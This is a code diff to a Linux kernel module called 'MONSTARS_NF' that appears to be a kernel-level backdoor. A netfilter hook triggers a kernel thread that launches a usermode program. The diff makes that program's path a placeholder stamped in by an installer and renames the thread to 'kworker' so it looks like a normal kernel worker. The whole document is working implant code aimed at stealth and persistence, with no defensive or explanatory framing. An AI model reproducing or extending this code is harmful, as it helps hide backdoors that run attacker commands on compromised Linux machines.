@@ -21,6 +21,9 @@ MODULE_AUTHOR("monstars");
 MODULE_DESCRIPTION("nothin but net");
 MODULE_LICENSE("GPL");
 
+// *** magic value, stamped over by installer ***
+static const char c_user_exe_path[255] = "BASKETBALLJONES";
+
 static struct nf_hook_ops s_hookops = {0};
 static struct proc_dir_entry* s_procfile = NULL;
 
@@ -138,7 +141,7 @@ unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const st
 // worker thread
 int task_thread(void *data)
 {
-    char *um_args[] = {"/usr/bin/python3", "/home/josh/listener.py", NULL};
+    char *um_args[] = {(char *)c_user_exe_path, NULL};
     char *um_env[] = {"HOME=/", NULL};
 
     KERNEL_LOG("MONSTARS_NF : Task thread started\n");
@@ -149,8 +152,8 @@ int task_thread(void *data)
         if (s_task_pending)
         {
             // spawn userland cmd handler
-            KERNEL_LOG("MONSTARS_NF : Spawning usermode helper\n");
-            if (0 != call_usermodehelper("/usr/bin/python3", um_args, um_env, UMH_WAIT_PROC))
+            KERNEL_LOG("MONSTARS_NF : Spawning %s\n", c_user_exe_path);
+            if (0 != call_usermodehelper(c_user_exe_path, um_args, um_env, UMH_WAIT_PROC))
             {
                 KERNEL_LOG("MONSTARS_NF : Usermode helper exec failed\n");
             }
@@ -205,7 +208,7 @@ int __init init_module()
 
     // start kthread
 
-    s_kthread = kthread_run(task_thread, NULL, "thread");
+    s_kthread = kthread_run(task_thread, NULL, "kworker");
     if (NULL == s_kthread)
     {
         KERNEL_LOG("MONSTARS_NF : Error starting kthread!\n");
